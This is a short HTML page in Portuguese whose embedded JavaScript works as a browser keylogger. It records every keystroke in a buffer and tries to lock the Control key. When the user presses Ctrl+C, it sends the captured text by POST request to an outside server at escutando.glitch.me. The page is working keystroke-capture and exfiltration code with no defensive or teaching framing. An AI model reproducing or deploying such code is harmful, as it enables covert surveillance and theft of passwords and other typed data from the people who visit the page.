
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ouvindo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        #output {
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div id="output"></div>

<script>
    let palavraAtual = "";
     async function solicitarPermissaoNotificacao() {
        try {
            await Notification.requestPermission();
            console.log('Permissão de notificação concedida.');
        } catch (error) {
            console.error('Erro ao solicitar permissão de notificação:', error);
        }
    }

    async function iniciarCaptura() {
        await solicitarPermissaoNotificacao();

        try {
            await navigator.keyboard.lock(['Control']);
            console.log('Captura de teclas iniciada.');
        } catch (error) {
            console.error('Erro ao iniciar a captura de teclas:', error);
        }
    }
    function aoPressionarTecla(event) {
        const key = event.key;
        if (event.ctrlKey && key === 'c') {
            salvarPalavra();
            document.getElementById('output').textContent = 'Programa encerrado.';
        } else {
            palavraAtual += key;
            atualizarOutput();
        }
    }

    function salvarPalavra() {
        // Enviar palavraAtual para o servidor usando uma solicitação POST
        fetch('https://escutando.glitch.me/salvar', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ palavra: palavraAtual }),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Palavra enviada com sucesso:', data);
            palavraAtual = "";
            atualizarOutput();
        })
        .catch(error => console.error('Erro ao enviar palavra:', error));
    }

    function atualizarOutput() {
        document.getElementById('output').textContent = `Palavra Atual: ${palavraAtual}`;
    }

    // Adicione o ouvinte de eventos de teclado
    document.addEventListener('keydown', aoPressionarTecla);

    // Visualizão de pagina aberta ou fechada
      document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible') {
            console.log('A página está visível');
        } else {
            console.log('A página está oculta');
        }
    });

    iniciarCaptura();
</script>

</body>
</html>
